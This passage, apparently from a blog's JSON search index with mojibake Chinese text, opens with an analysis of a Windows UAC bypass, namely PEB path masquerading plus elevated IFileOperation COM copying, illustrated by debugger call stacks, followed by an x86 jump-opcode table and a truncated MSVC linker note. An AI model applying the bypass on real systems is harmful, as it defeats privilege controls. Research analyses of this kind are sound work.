è¯»å–è¿›ç¨‹PEBç»“æ„ä¸­çš„Commandlineæ¥è¯†åˆ«å®ƒä»¬æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ã€‚å¦‚æœå°†è¿›ç¨‹çš„ Path æ”¹æˆå¯ä¿¡æ–‡ä»¶(å¦‚explorer.exe)ï¼Œå°±èƒ½å¤Ÿæ¬ºéª—PSAPIï¼Œè°ƒç”¨COMç»„ä»¶IFileOperationå®ç°è¶Šæƒå¤åˆ¶ PSAPIï¼šè¿›ç¨‹çŠ¶æ€APIï¼Œä¸»è¦æä¾›ç”¨äºæ£€ç´¢ä¸€ä¸‹ä¿¡æ¯çš„å‡½æ•°é›†ï¼š è¿›ç¨‹ä¿¡æ¯ å¦‚ EnumProcesses æ¨¡å—ä¿¡æ¯ å¦‚ EnumProcessModules è®¾å¤‡é©±åŠ¨ç¨‹åºä¿¡æ¯ å¦‚ EnumDeviceDrivers è¿›ç¨‹å†…å­˜ä½¿ç”¨æƒ…å†µä¿¡æ¯ å¦‚ GetProcessMemoryInfo å·¥ä½œé›†ä¿¡æ¯ å¦‚ QueryWorkingSet å†…å­˜æ˜ å°„æ–‡ä»¶ä¿¡æ¯ å¦‚GetMappedFileName COMè°ƒç”¨å †æ ˆå¦‚ä¸‹æ‰€ç¤º å¦‚ä¸‹æ‰€ç¤ºä¸ºå¯åŠ¨ä¸€ä¸ªuacè¿›ç¨‹åˆ°è¯¥è¿›ç¨‹å‘èµ·rpcçš„è°ƒç”¨å †æ ˆï¼Œé¡»çŸ¥å½“å‰è¿›ç¨‹çš„ææƒæ˜¯é€šè¿‡ RPC è°ƒç”¨åˆ° Appinfo æœåŠ¡çš„ã€‚æµç¨‹å¦‚ä¸‹ï¼š uac é€šè¿‡ RPC è¯·æ±‚åˆ° AppInfo æœåŠ¡ APPInfo é€šè¿‡ AiLaunchProcess æ¥å£åˆ›å»º consent.exe è¿›ç¨‹ï¼Œè°ƒç”¨æ—¶ä¼šä¼ å…¥ä¸€ä¸ªç»“æ„ä½“åœ°å€ï¼Œè°ƒç”¨å‘½ä»¤è¡Œä¸º consent.exe ppid ç»“æ„ä½“é•¿åº¦ ç»“æ„ä½“åœ°å€ consent.exe ä¼šæ ¹æ®ç”¨æˆ·æ“ä½œå°†ç»“æœå†™å…¥ç»“æ„ä½“ä¸­ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041[0x0] RPCRT4!LRPC_BASE_CCALL::DoAsyncSend+0x21c 0xbddbc4 0x76538061 [0x1] RPCRT4!LRPC_CCALL::AsyncSend+0x61 0xbddc48 0x7653796e [0x2] RPCRT4!I_RpcSend+0x7e 0xbddc64 0x75dda34a [0x3] combase!CAsyncCall::RpcSendRequest+0xaf 0xbddc8c 0x75e59faa [0x4] combase!ThreadSendReceive+0xa4f 0xbdddd0 0x75dd77f8 [0x5] combase!CSyncClientCall::SwitchAptAndDispatchCall+0xadb 0xbdddd0 0x75dd77f8 [0x6] combase!CSyncClientCall::SendReceive2+0xbca 0xbdddd0 0x75dd77f8 [0x7] combase!SyncClientCallRetryContext::SendReceiveWithRetry+0x29 0xbddfa8 0x75e5c0a7 [0x8] combase!CSyncClientCall::SendReceiveInRetryContext+0x29 0xbddfa8 0x75e5c0a7 [0x9] combase!ClassicSTAThreadSendReceive+0x98 0xbddfa8 0x75e5c0a7 [0xa] combase!CSyncClientCall::SendReceive+0x2a7 0xbde06c 0x75de0468 [0xb] combase!CClientChannel::SendReceive+0x79 0xbde258 0x76516b23 [0xc] combase!NdrExtpProxySendReceive+0xc8 0xbde258 0x76516b23 [0xd] RPCRT4!NdrClientCall2+0x9e3 0xbde280 0x75eaeaa0 [0xe] combase!ObjectStublessClient+0x70 0xbde6d0 0x75ea6a3f [0xf] combase!ObjectStubless+0xf 0xbde6f0 0x75e113f5 [0x10] combase!CRpcResolver::DelegateActivationToSCM+0x30e 0xbde700 0x75e8c69c [0x11] combase!CRpcResolver::CreateInstance+0x14 0xbde80c 0x75e12d54 [0x12] combase!CClientContextActivator::CreateInstance+0x144 0xbde828 0x75e124d4 [0x13] combase!ActivationPropertiesIn::DelegateCreateInstance+0xc4 0xbdea88 0x75e3a762 [0x14] combase!ICoCreateInstanceEx+0xc12 0xbdead4 0x75e399d1 [0x15] combase!CComActivator::DoCreateInstance+0x231 0xbdedd8 0x75f4bec1 [0x16] combase!CComActivator::StandardCreateInstance+0x81 0xbdeecc 0x75ba8686 [0x17] ole32!CLUAMoniker::CreateInstance+0x126 0xbdf73c 0x63e8f20f [0x18] comsvcs!CNewMoniker::BindToObject+0x12f 0xbdf77c 0x75b869cd [0x19] ole32!CCompositeMoniker::BindToObject+0x19d 0xbdf7f8 0x75b84f9e [0x1a] ole32!CoGetObject+0xbe 0xbdf82c 0x74e70e88 [0x1b] windows_storage!CoCreateInstanceAsAdmin+0xb2 0xbdf878 0x74e7e364 [0x1c] windows_storage!CFileOperation::_CreateElevatedCopyengine+0x43 0xbdfb80 0x74e8293a [0x1d] windows_storage!CFileOperation::_RunElevatedOperation+0x4d 0xbdfbf4 0x74ce1761 [0x1e] windows_storage!CFileOperation::_ProcessLUAOperations+0x118056 0xbdfc28 0x74bc878a [0x1f] windows_storage!CFileOperation::PrepareAndDoOperations+0x238 0xbdfc7c 0x74bc2274 [0x20] windows_storage!CFileOperation::PerformOperations+0xd4 0xbdfcec 0xa03f55 [0x21] MasqueradePEBtoCopyfile!wmain+0x365 0xbdfd1c 0xa047fe [0x22] MasqueradePEBtoCopyfile!__scrt_wide_environment_policy::initialize_environment+0x2e 0xbdfe80 0xa04667 [0x23] MasqueradePEBtoCopyfile!__crt_char_traits&lt;wchar_t&gt;::tcscpy_s&lt;wchar_t * &amp;,unsigned int,wchar_t const * const &amp;&gt;+0x1d7 0xbdfe94 0xa044fd [0x24] MasqueradePEBtoCopyfile!__crt_char_traits&lt;wchar_t&gt;::tcscpy_s&lt;wchar_t * &amp;,unsigned int,wchar_t const * const &amp;&gt;+0x6d 0xbdfef0 0xa04878 [0x25] MasqueradePEBtoCopyfile!wmainCRTStartup+0x8 0xbdfef8 0x76cdfcc9 [0x26] KERNEL32!BaseThreadInitThunk+0x19 0xbdff00 0x77607c6e [0x27] ntdll!__RtlUserThreadStart+0x2f 0xbdff10 0x77607c3e [0x28] ntdll!_RtlUserThreadStart+0x1b 0xbdff6c 0x0 CoGetObject çš„åˆ›å»ºç®¡ç†å‘˜å¯¹è±¡ åˆ°è¾¾ AppInfo åï¼Œ è°ƒç”¨å †æ ˆå¦‚ä¸‹æ‰€ç¤ºï¼š 1234567891011121314151617181920212223[0x0] ntdll!NtCreateUserProcess 0xdf231fc698 0x7ff9da72b473 [0x1] KERNELBASE!CreateProcessInternalW+0xfe3 0xdf231fc6a0 0x7ff9da728a03 [0x2] KERNELBASE!CreateProcessAsUserW+0x63 0xdf231fdc70 0x7ff9daa4de30 [0x3] KERNEL32!CreateProcessAsUserWStub+0x60 0xdf231fdce0 0x7ff9d4a4526b [0x4] appinfo!AiLaunchProcess+0x8eb 0xdf231fdd50 0x7ff9d4a4789d [0x5] appinfo!AiLaunchConsentUI+0x51d 0xdf231fec40 0x7ff9d4a471e3 [0x6] appinfo!AiCheckLUA+0x343 0xdf231fee60 0x7ff9d4a62ff1 [0x7] appinfo!AipGetTokenForService+0x245 0xdf231ff040 0x7ff9d4a639b6 [0x8] appinfo!RAiGetTokenForCOM+0x206 0xdf231ff160 0x7ff9db4ab4b3 [0x9] RPCRT4!Invoke+0x73 0xdf231ff220 0x7ff9db50c5ea [0xa] RPCRT4!Ndr64AsyncServerWorker+0x39a 0xdf231ff2d0 0x7ff9db489188 [0xb] RPCRT4!DispatchToStubInCNoAvrf+0x18 0xdf231ff3e0 0x7ff9db46a3a6 [0xc] RPCRT4!RPC_INTERFACE::DispatchToStubWorker+0x1a6 0xdf231ff430 0x7ff9db469fd6 [0xd] RPCRT4!RPC_INTERFACE::DispatchToStubWithObject+0x186 0xdf231ff510 0x7ff9db47730f [0xe] RPCRT4!LRPC_SCALL::DispatchRequest+0x16f 0xdf231ff5b0 0x7ff9db4768c8 [0xf] RPCRT4!LRPC_SCALL::HandleRequest+0x7f8 0xdf231ff680 0x7ff9db475eb1 [0x10] RPCRT4!LRPC_ADDRESS::HandleRequest+0x341 0xdf231ff790 0x7ff9db47591e [0x11] RPCRT4!LRPC_ADDRESS::ProcessIO+0x89e 0xdf231ff830 0x7ff9db47a032 [0x12] RPCRT4!LrpcIoComplete+0xc2 0xdf231ff970 0x7ff9dc990330 [0x13] ntdll!TppAlpcpExecuteCallback+0x260 0xdf231ffa10 0x7ff9dc9c2f86 [0x14] ntdll!TppWorkerThread+0x456 0xdf231ffa90 0x7ff9daa47344 [0x15] KERNEL32!BaseThreadInitThunk+0x14 0xdf231ffd90 0x7ff9dc9c26b1 [0x16] ntdll!RtlUserThreadStart+0x21 0xdf231ffdc0 0x0 è¶ŠæƒåŸç† åŸºäºä»¥ä¸Šæè¿°ï¼Œæˆ‘ä»¬å¤§æ¦‚äº†è§£äº†å¯åŠ¨ä¸€ä¸ªUACè¿›ç¨‹çš„æµç¨‹å’Œè¿‡ç¨‹ã€‚é‚£ä¹ˆï¼Œåˆ°åº•æ˜¯åœ¨å“ªä¸€æ­¥åˆ¤æ–­ä¸­è¿›ç¨‹çš„UACé‰´æƒæ“ä½œã€‚ å¤„ç†é€»è¾‘ï¼šAIS(appinfo.dll) æœåŠ¡ï¼šå¤„ç†æå‡è¯·æ±‚ ä¸»è¦çœ‹ä¸€ä¸‹ AipGetTokenForService å‡½æ•°ã€‚ä»¥ä¸‹ 2 ç§æƒ…å†µå¯èƒ½ä¸ä¼šå¼¹ UAC å¯¹è¯æ¡†ï¼Œä¼šè‡ªåŠ¨æå‡è‡³ç®¡ç†å‘˜æƒé™ï¼ˆè¶Šæƒä¹Ÿæ˜¯åŸºäºç™½åå•ï¼‰ï¼š UAC æµç¨‹ ç®€å•è¯´æ˜ä¸€ä¸‹UACçš„è¯·æ±‚æµç¨‹ã€‚ ç¨‹åºé…ç½®ä¸ºè‡ªåŠ¨æå‡ å¦‚æœç¨‹åºä¸­é…ç½®äº† autoElevate ä¸º trueï¼Œä¼šå°è¯•è‡ªåŠ¨æå‡ â€‹ 1. å…ˆåˆ¤æ–­æ˜¯å¦é™åˆ¶è‡ªåŠ¨ææƒç­–ç•¥ â€‹ 2. åˆ¤æ–­æ˜¯å¦è®¾ç½®äº† autoElevate ç™½åå• åˆ¤æ–­è¦æ‰§è¡Œçš„ç¨‹åºæ˜¯å¦å±äºç™½åå•ï¼Œåœ¨ç™½åå•ä¹‹å†…å°±è°ƒç”¨ AipIsValidAutoApprovalEXE å‡½æ•°æ£€æŸ¥ç¨‹åºç­¾åç­‰ä¿¡æ¯ï¼Œå¦‚æœä¸åœ¨å°±åŸºæœ¬ç»“æŸè¿™ä¸ªå‡½æ•°äº† ä¾é ä¸Šè¿°ä¸¤ä¸ªåˆ¤æ–­è¿˜æ˜¯ä¸å¤Ÿçš„ï¼Œåœ¨ appinfo ä¸­è¿˜æœ‰å¦‚ä¸‹æ‰€ç¤ºçš„å‡ ä¸ªåˆ—è¡¨ã€‚ g_lpExcludedWindowsDirs .duxenonllbst{zoom:80%;} g_lpIncludedWindowsDirs .temmksvxwpvo{zoom:80%;} g_lpIncludedSystemDirs .pnjamnjrmdib{zoom:80%;} g_lpIncludedPFDirs .gvolqcrocuxr{zoom:80%;} consentè¿›ç¨‹æ‰§è¡Œé€»è¾‘ åœ¨è¿›è¡Œä¸Šè¿°åˆ¤æ–­ä¹‹åä¼šåˆ›å»º consent è¿›ç¨‹ï¼Œä¼ é€’çˆ¶è¿›ç¨‹idä»¥åŠå†…å­˜åœ°å€ å†™å…¥consentè¿›ç¨‹å‚æ•° .jojlppezsdxw{zoom:80%;} æ‹‰èµ·consentè¿›ç¨‹ Buffer å°±æ˜¯ consent è¿›ç¨‹çš„ commandlineã€‚ ç»§ç»­åˆ†æ consent è¿›ç¨‹çš„æ‰§è¡Œé€»è¾‘ã€‚è°ƒç”¨åï¼Œé¦–å…ˆå¯¹å‘½ä»¤è¡Œè¿›è¡Œäº†è§£æã€‚ éšåè¯»å–äº†ä¼ å…¥çš„ç»“æ„ä½“ ææƒæ“ä½œç»“æŸåï¼Œå°†ç”¨æˆ·æ“ä½œç»“æœå†™å›ç»™ appinfo è¿›ç¨‹ç›´æ¥ä¸­ã€‚ .tlnvsjpzsqdo{zoom:80%;} å¼¹çª—é€»è¾‘ ä½†æ˜¯ä¸­é—´å¼¹çª—çš„è¿‡ç¨‹è¢«çœç•¥äº†ï¼Œè¿™é‡Œå¯ä»¥è°ƒè¯•åˆ†æä¸€ä¸‹ã€‚ä¸»è¦å°±æ˜¯é€šè¿‡æŸ¥çœ‹COMç»„ä»¶æœ‰æ²¡æœ‰è‡ªæå‡æƒé™è¿›è€Œåˆ¤æ–­æ˜¯å¦éœ€è¦å¼¹çª—ï¼ŒæŸ¥çœ‹ CuiIsCOMClassAutoApprovable å³å¯ã€‚ è¶Šæƒé€»è¾‘ è¶Šæƒä¸»è¦è¿˜æ˜¯åŸºäºä»¥ä¸‹ä¸¤ç‚¹ï¼Œæµç¨‹ä¸Šå’Œ consent.exe æ˜¯ä¸æ¶‰åŠçš„ã€‚ å„ç±»UACç™½åå•ç¨‹åºçš„DLLåŠ«æŒï¼ˆDll Hijackï¼‰ å„ç±»æå‡æƒé™çš„COMæ¥å£åˆ©ç”¨ï¼ˆElevated COM interfaceï¼‰ å¯åˆ©ç”¨çš„COMæ¥å£æœ‰å“ªäº›ï¼Œå¯ä»¥åœ¨ HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\UAC\\\\COMAutoApprovalList æ³¨å†Œè¡¨ä¸‹æŸ¥çœ‹å€¼ä¸º é”®å€¼é¡¹ä¸º1 çš„é¡¹ä¸ºå¯ä»¥è‡ªæå‡çš„ã€‚ æœ¬æ–‡ä¼ªè£…PEBæ‰€ç¤ºçš„ä»£ç å°±æ˜¯é€šè¿‡ç™½åå• g_lpIncludedSystemDirs å®ç°çš„ã€‚æ£€æŸ¥çš„å †æ ˆä¸ºï¼š appinfo!RAiGetTokenForCOM -&gt; appinfo!AipGetTokenForService -&gt; appinfo!AiCheckSecureApplicationDirectory -&gt; appinfo!AipCheckSecureWindowsDirectory æˆ–è€… AipCheckSecurePFDirectory(å–å†³äºä¼ é€’çš„è·¯å¾„) ä¿®æ”¹ä¸º C:\\windows\\explorer.exe ä¹‹åï¼Œå…¶ç›¸å½“äºä»ç™½åå•å¯åŠ¨çš„è¿›ç¨‹ï¼Œå› æ­¤å¯ä»¥ç»•è¿‡consentï¼Œç›´æ¥è·å–æƒé™ã€‚ æ–‡ä»¶å¯åŠ¨è·¯å¾„ è·å–ç¨‹åºè¿è¡Œè·¯å¾„çš„å †æ ˆ 123456789101112131415161718192021222324252627282930[0x0] combase!&lt;lambda_7438a189e512c84b56128b16ff6946f3&gt;::operator()+0x9d 0x71d5d8 0x75070f45 [0x1] combase!CRpcResolver::GetConnection+0x70 0x71db48 0x75051915 [0x2] combase!CoInitializeSecurity+0xe5 0x71db78 0x750ed384 [0x3] combase!InitializeSecurity+0x4f 0x71ddec 0x7509196b [0x4] combase!CComApartment::InitRemoting+0x8d 0x71de20 0x750b1ce2 [0x5] combase!CComApartment::StartServer+0x60 0x71de64 0x7506dd3d [0x6] combase!InitChannelIfNecessary+0xb2 0x71de64 0x7506dd3d [0x7] combase!CGIPTable::RegisterInterfaceInGlobalHlp+0x4d 0x71de80 0x7506dce5 [0x8] combase!CGIPTable::RegisterInterfaceInGlobal+0x15 0x71dec0 0x7453b91b [0x9] windows_storage!CFreeThreadedItemContainer::Initialize+0x8b 0x71ded8 0x7453b1b0 [0xa] windows_storage!CFSPropertyStoreFactory_CreateInstance+0x360 0x71df0c 0x7451ab6b [0xb] windows_storage!CFSFolder::_BindToChild+0x10e 0x71e15c 0x7454e000 [0xc] windows_storage!CFSFolder::_Bind+0xa10 0x71e928 0x7454d279 [0xd] windows_storage!CFSFolder::BindToObject+0x4c9 0x71ec3c 0x74562745 [0xe] windows_storage!CShellItem::BindToHandler+0x525 0x71ef1c 0x7455e92e [0xf] windows_storage!CShellItem::_GetPropertyStoreWorker+0x2ee 0x71f1ec 0x7457313d [0x10] windows_storage!CShellItem::GetPropertyStoreForKeys+0x11d 0x71f260 0x745a1977 [0x11] windows_storage!CShellItem::GetString+0x57 0x71f4e8 0x745a18e3 [0x12] windows_storage!IShellItem_GetFileName+0x5b 0x71f530 0x745a0934 [0x13] windows_storage!CPendingOperation::AddToTree+0x114 0x71f55c 0x745a07fb [0x14] windows_storage!CCopyTree::InitializeFromPendingList+0x9a 0x71f7b0 0x7459224f [0x15] windows_storage!CFileOperation::PerformOperations+0xaf 0x71f7d4 0x543f55 [0x16] MasqueradePEBtoCopyfile!wmain+0x365 0x71f818 0x5447fe [0x17] MasqueradePEBtoCopyfile!__scrt_wide_environment_policy::initialize_environment+0x2e 0x71f97c 0x544667 [0x18] MasqueradePEBtoCopyfile!__crt_char_traits&lt;wchar_t&gt;::tcscpy_s&lt;wchar_t * &amp;,unsigned int,wchar_t const * const &amp;&gt;+0x1d7 0x71f990 0x5444fd [0x19] MasqueradePEBtoCopyfile!__crt_char_traits&lt;wchar_t&gt;::tcscpy_s&lt;wchar_t * &amp;,unsigned int,wchar_t const * const &amp;&gt;+0x6d 0x71f9ec 0x544878 [0x1a] MasqueradePEBtoCopyfile!wmainCRTStartup+0x8 0x71f9f4 0x7612fcc9 [0x1b] KERNEL32!BaseThreadInitThunk+0x19 0x71f9fc 0x76fd7c6e [0x1c] ntdll!__RtlUserThreadStart+0x2f 0x71fa0c 0x76fd7c3e [0x1d] ntdll!_RtlUserThreadStart+0x1b 0x71fa68 0x0 è·å–dllçš„å †æ ˆ 12[0x0] ntdll!LdrGetDllFullName 0x71d974 0x76de5a56 [0x1] KERNELBASE!GetModuleFileNameW+0x46 0x71d978 0x750ff6ee","tags":[{"name":"windows","slug":"windows","permalink":"https://hodlyounger.github.io/tags/windows/"},{"name":"COM","slug":"COM","permalink":"https://hodlyounger.github.io/tags/COM/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"COM","slug":"A-OS/Windows/COM","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/COM/"}]},{"title":"ã€æ±‡ç¼–ã€‘JCC","date":"2023-11-19T16:00:00.000Z","path":"B_Code/æ±‡ç¼–/ã€æ±‡ç¼–ã€‘JCC/","text":"æ¦‚è¿°: JCC æ±‡ç¼–æŒ‡ä»¤ 0x01 æŒ‡ä»¤å…¨è‹± æŒ‡ä»¤ FALG A above ZF=0 OR CF=0 B blow CF=1 E equal ZF=1 N not C carry CF=1 G great SF==OF &amp;&amp; ZF=0 L less SF!=OF O overflow OF=1 P parity even å¥‡å¶ PF=1 S signä¸ºè´Ÿ SF=1 Z zeroä¸º0 ZF=1 0x02 åŸºäºç‰¹å®šæ ‡å¿—ä½å€¼çš„è·³è½¬ æŒ‡ä»¤ è¯´æ˜ JC è¿›ä½è·³è½¬ï¼ˆè¿›ä½æ ‡å¿—ä½ç½® 1ï¼‰ JNC æ— è¿›ä½è·³è½¬ï¼ˆè¿›ä½æ ‡å¿—ä½æ¸…é›¶ï¼‰ JZ/JE ç»“æœä¸ºé›¶åˆ™è·³è½¬ï¼ˆç›¸ç­‰æ—¶è·³è½¬ï¼‰ JNZ ç»“æœä¸ä¸ºé›¶åˆ™è·³è½¬ï¼ˆä¸ç›¸ç­‰æ—¶è·³è½¬ï¼‰ JS ç»“æœä¸ºè´Ÿåˆ™è·³è½¬ JNS ç»“æœä¸ºéè´Ÿåˆ™è·³è½¬ JP ç»“æœä¸­1çš„ä¸ªæ•°ä¸ºå¶æ•°åˆ™è·³è½¬ JNP ç»“æœä¸­1çš„ä¸ªæ•°ä¸ºå¥‡æ•°åˆ™è·³è½¬ JO ç»“æœæº¢å‡ºäº†åˆ™è·³è½¬ JNO ç»“æœæ²¡æœ‰æº¢å‡ºåˆ™è·³è½¬ 0x03 JCCæ»¡è¶³æ¡ä»¶æ—¶è·³è½¬ æ“ä½œç  æŒ‡ä»¤ è¯´æ˜ 77 cb JA rel8 é«˜äºï¼ˆCF=0 ä¸” ZF=0ï¼‰æ—¶çŸ­è·³è½¬ 73 cb JAE rel8 é«˜äºæˆ–ç­‰äº (CF=0) æ—¶çŸ­è·³è½¬ 72 cb JB rel8 ä½äº (CF=1) æ—¶çŸ­è·³è½¬ 76 cb JBE rel8 ä½äºæˆ–ç­‰äºï¼ˆCF=1 æˆ– ZF=1ï¼‰æ—¶çŸ­è·³è½¬ 72 cb JC rel8 è¿›ä½ (CF=1) æ—¶çŸ­è·³è½¬ E3 cb JCXZ rel8 CX å¯„å­˜å™¨ä¸º 0 æ—¶çŸ­è·³è½¬ E3 cb JECXZ rel8 ECX å¯„å­˜å™¨ä¸º 0 æ—¶çŸ­è·³è½¬ 74 cb JE rel8 ç­‰äº (ZF=1) æ—¶çŸ­è·³è½¬ 7F cb JG rel8 å¤§äºï¼ˆZF=0 ä¸” SF=OFï¼‰æ—¶çŸ­è·³è½¬ 7D cb JGE rel8 å¤§äºæˆ–ç­‰äº (SF=OF) æ—¶çŸ­è·³è½¬ 7C cb JL rel8 å°äº (SF&lt;&gt;OF) æ—¶çŸ­è·³è½¬ 7E cb JLE rel8 å°äºæˆ–ç­‰äºï¼ˆZF=1 æˆ– SF&lt;&gt;OFï¼‰æ—¶çŸ­è·³è½¬ 76 cb JNA rel8 ä¸é«˜äºï¼ˆCF=1 æˆ– ZF=1ï¼‰æ—¶çŸ­è·³è½¬ 72 cb JNAE rel8 ä¸é«˜äºæˆ–ç­‰äº (CF=1) æ—¶çŸ­è·³è½¬ 73 cb JNB rel8 ä¸ä½äº (CF=0) æ—¶çŸ­è·³è½¬ 77 cb JNBE rel8 ä¸ä½äºæˆ–ç­‰äºï¼ˆCF=0 æˆ– ZF=0ï¼‰æ—¶çŸ­è·³è½¬ 73 cb JNC rel8 æ— è¿›ä½ (CF=0) æ—¶çŸ­è·³è½¬ 75 cb JNE rel8 ä¸ç›¸ç­‰ (ZF=0) æ—¶çŸ­è·³è½¬ 7E cb JNG rel8 ä¸å¤§äºï¼ˆZF=1 æˆ– SF&lt;&gt;OFï¼‰æ—¶çŸ­è·³è½¬ 7C cb JNGE rel8 ä¸å¤§äºæˆ–ç­‰äº (SF&lt;&gt;OF) æ—¶çŸ­è·³è½¬ 7D cb JNL rel8 ä¸å°äº (SFï¼OF) æ—¶çŸ­è·³è½¬ 7F cb JNLE rel8 ä¸å°äºæˆ–ç­‰äºï¼ˆZF=0 ä¸” SF=OFï¼‰æ—¶çŸ­è·³è½¬ 71 cb JNO rel8 ä¸ä¸Šæº¢ (OF=0) æ—¶çŸ­è·³è½¬ 7B cb JNP rel8 å¥‡æ ¡éªŒ (PF=0) æ—¶çŸ­è·³è½¬ 79 cb JNS rel8 æ­£æ•°æ—¶ (SFï¼0) çŸ­è·³è½¬ 75 cb JNZ rel8 ä¸ä¸ºé›¶ (ZF=0) æ—¶çŸ­è·³è½¬ 70 cb JO rel8 ä¸Šæº¢ (OF=1) æ—¶çŸ­è·³è½¬ 7A cb JP rel8 å¶æ ¡éªŒ (PF=1) æ—¶çŸ­è·³è½¬ 7A cb JPE rel8 å¶æ ¡éªŒ (PF=1) æ—¶çŸ­è·³è½¬ 7B cb JPO rel8 å¥‡æ ¡éªŒ (PF=0) æ—¶çŸ­è·³è½¬ 78 cb JS rel8 è´Ÿæ•° (SF=1) æ—¶çŸ­è·³è½¬ 74 cb JZ rel8 ä¸ºé›¶ (ZF=1) æ—¶çŸ­è·³è½¬ 0F 87 cw/cd JA rel16/32 é«˜äºï¼ˆCF=0 ä¸” ZF=0ï¼‰æ—¶è¿‘è·³è½¬ 0F 83 cw/cd JAE rel16/32 é«˜äºæˆ–ç­‰äº (CF=0) æ—¶è¿‘è·³è½¬ 0F 82 cw/cd JB rel16/32 ä½äº (CF=1) æ—¶è¿‘è·³è½¬ 0F 86 cw/cd JBE rel16/32 ä½äºæˆ–ç­‰äºï¼ˆCF=1 æˆ– ZF=1ï¼‰æ—¶è¿‘è·³è½¬ 0F 82 cw/cd JC rel16/32 è¿›ä½ (CF=1) æ—¶è¿‘è·³è½¬ 0F 84 cw/cd JE rel16/32 ç›¸ç­‰ (ZF=1) æ—¶è¿‘è·³è½¬ 0F 84 cw/cd JZ rel16/32 ä¸º 0 (ZF=1) æ—¶è¿‘è·³è½¬ 0F 8F cw/cd JG rel16/32 å¤§äºï¼ˆZF=0 ä¸” SF=OFï¼‰æ—¶è¿‘è·³è½¬ æ“ä½œç  æŒ‡ä»¤ è¯´æ˜ 0F 8D cw/cd JGE rel16/32 å¤§äºæˆ–ç­‰äº (SF=OF) æ—¶è¿‘è·³è½¬ 0F 8C cw/cd JL rel16/32 å°äº (SF&lt;&gt;OF) æ—¶è¿‘è·³è½¬ 0F 8E cw/cd JLE rel16/32 å°äºæˆ–ç­‰äºï¼ˆZF=1 æˆ– SF&lt;&gt;OFï¼‰æ—¶è¿‘è·³è½¬ 0F 86 cw/cd JNA rel16/32 ä¸é«˜äºï¼ˆCF=1 æˆ– ZF=1ï¼‰æ—¶è¿‘è·³è½¬ 0F 82 cw/cd JNAE rel16/32 ä¸é«˜äºæˆ–ç­‰äº (CF=1) æ—¶è¿‘è·³è½¬ 0F 83 cw/cd JNB rel16/32 ä¸ä½äº (CF=0) æ—¶è¿‘è·³è½¬ 0F 87 cw/cd JNBE rel16/32 ä¸ä½äºæˆ–ç­‰äºï¼ˆCF=0 æˆ– ZF=0ï¼‰æ—¶è¿‘è·³è½¬ 0F 83 cw/cd JNC rel16/32 æ— è¿›ä½ (CF=0) æ—¶è¿‘è·³è½¬ 0F 85 cw/cd JNE rel16/32 ä¸ç›¸ç­‰ (ZF=0) æ—¶è¿‘è·³è½¬ 0F 8E cw/cd JNG rel16/32 ä¸å¤§äºï¼ˆZF=1 æˆ– SF&lt;&gt;OFï¼‰æ—¶è¿‘è·³è½¬ 0F 8C cw/cd JNGE rel16/32 ä¸å¤§äºæˆ–ç­‰äº (SF&lt;&gt;OF) æ—¶è¿‘è·³è½¬ 0F 8D cw/cd JNL rel16/32 ä¸å°äº (SFï¼OF) æ—¶è¿‘è·³è½¬ 0F 8F cw/cd JNLE rel16/32 ä¸å°äºæˆ–ç­‰äºï¼ˆZF=0 ä¸” SF=OFï¼‰æ—¶è¿‘è·³è½¬ 0F 81 cw/cd JNO rel16/32 ä¸ä¸Šæº¢ (OF=0) æ—¶è¿‘è·³è½¬ 0F 8B cw/cd JNP rel16/32 å¥‡æ ¡éªŒ (PF=0) æ—¶è¿‘è·³è½¬ 0F 89 cw/cd JNS rel16/32 æ­£æ•° (SFï¼0) æ—¶è¿‘è·³è½¬ 0F 85 cw/cd JNZ rel16/32 ä¸ä¸ºé›¶ (ZF=0) æ—¶è¿‘è·³è½¬ 0F 80 cw/cd JO rel16/32 ä¸Šæº¢ (OF=1) æ—¶è¿‘è·³è½¬ 0F 8A cw/cd JP rel16/32 å¶æ ¡éªŒ (PF=1) æ—¶è¿‘è·³è½¬ 0F 8A cw/cd JPE rel16/32 å¶æ ¡éªŒ (PF=1) æ—¶è¿‘è·³è½¬ 0F 8B cw/cd JPO rel16/32 å¥‡æ ¡éªŒ (PF=0) æ—¶è¿‘è·³è½¬ 0F 88 cw/cd JS rel16/32 è´Ÿæ•° (SFï¼1) æ—¶è¿‘è·³è½¬ 0F 84 cw/cd JZ rel16/32 ä¸º 0 (ZF=1) æ—¶è¿‘è·³è½¬","tags":[{"name":"æ±‡ç¼–","slug":"æ±‡ç¼–","permalink":"https://hodlyounger.github.io/tags/%E6%B1%87%E7%BC%96/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"æ±‡ç¼–","slug":"B-Code/æ±‡ç¼–","permalink":"https://hodlyounger.github.io/categories/B-Code/%E6%B1%87%E7%BC%96/"}]},{"title":"ã€Visual Studioã€‘ MSVCé“¾æ¥å™¨é€‰é¡¹","date":"2023-11-17T02:44:56.766Z","path":"A_OS/Windows/Visual Studio/ã€Visual Studioã€‘MSVCé“¾æ¥å™¨é€‰é¡¹/","text":"æ¦‚è¿°ï¼šå†·çŸ¥è¯†ã€‚MSVC é“¾æ¥å™¨é€‰é¡¹è®¾ç½® 0x01 MSVCé“¾æ¥å™¨é€‰é¡¹è®¾ç½® MSVC é“¾æ¥å™¨å‚è€ƒ | Microsoft Learn 0x02 Demo /LARGEADDRESSAWARE æ‹¥æœ‰æ›´å¤§ç”¨æˆ·æ€å†…å­˜ /LARGEADDRESSAWARE é€‰é¡¹æŒ‡ç¤ºé“¾æ¥å™¨ï¼Œåº”ç”¨ç¨‹åºå¯ä»¥å¤„ç†å¤§äº 2 GB çš„åœ°å€ã€‚ åœ¨ 64 ä½ç¼–è¯‘å™¨ä¸­ï¼Œæ­¤é€‰é¡¹é»˜è®¤å¤„äºå¯ç”¨çŠ¶æ€ã€‚ åœ¨ 32 ä½ç¼–è¯‘å™¨ä¸­ï¼Œå¦‚æœæœªåœ¨é“¾æ¥å™¨è¡Œä¸ŠæŒ‡å®š /LARGEADDRESSAWAREï¼Œåˆ™å¯ç”¨ /LARGEADDRESSAWARE:NOã€‚ å¦‚æœåº”ç”¨ç¨‹åºå·²é“¾æ¥åˆ° 